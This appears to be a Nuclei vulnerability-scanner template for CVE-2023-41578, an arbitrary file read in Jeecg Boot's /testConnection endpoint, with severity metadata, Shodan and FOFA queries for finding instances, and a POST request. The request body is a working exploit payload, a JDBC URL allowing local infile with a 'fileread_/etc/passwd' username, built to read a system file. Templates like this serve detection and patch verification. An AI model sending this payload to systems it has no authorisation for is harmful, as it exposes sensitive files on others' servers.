id: CVE-2023-41578

info:
  name: Jeecg Boot Arbitrary File Read Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: Jeecg boot up to v3.5.3 was discovered to contain an arbitrary file read vulnerability via the interface /testConnection.
  impact: |
    An attacker can access sensitive information stored in files on the system.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version.
  reference:
    - https://github.com/Snakinya/Bugs/issues/1
    - https://github.com/Snakinya/Snakinya
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2023-41578
    epss-score: 0.00154
    epss-percentile: 0.52839
    cpe: cpe:2.3:a:jeecg:jeecg_boot:*:*:*:*:*:*:*:*
  metadata:
    vendor: jeecg
    product: jeecg_boot
    shodan-query: http.favicon.hash:1380908726
    fofa-query:
      - icon_hash=1380908726
      - title="jeecg-boot"

http:
  - method: POST
    path:
      - "{{BaseURL}}/jeecg-boot/jmreport/testConnection"

    headers:
      Content-Type: application/json

    body: |
      {
        "id": "1",
        "code": "select * from information_schema.tables",
        "dbType": "jndi",
        "dbDriver": "com.mysql.cj.jdbc.Driver",
        "dbUrl": "jdbc:mysql://localhost:3307/test?allowLoadLocalInfile=yes",
        "dbName": "information_schema",
        "dbUsername": "fileread_/etc/passwd",
        "dbPassword": "password",
        "connectionTimaes": "5"
      }
    matchers:
      - type: word
        words:
          - "successful"
          - "failed"
        part: body
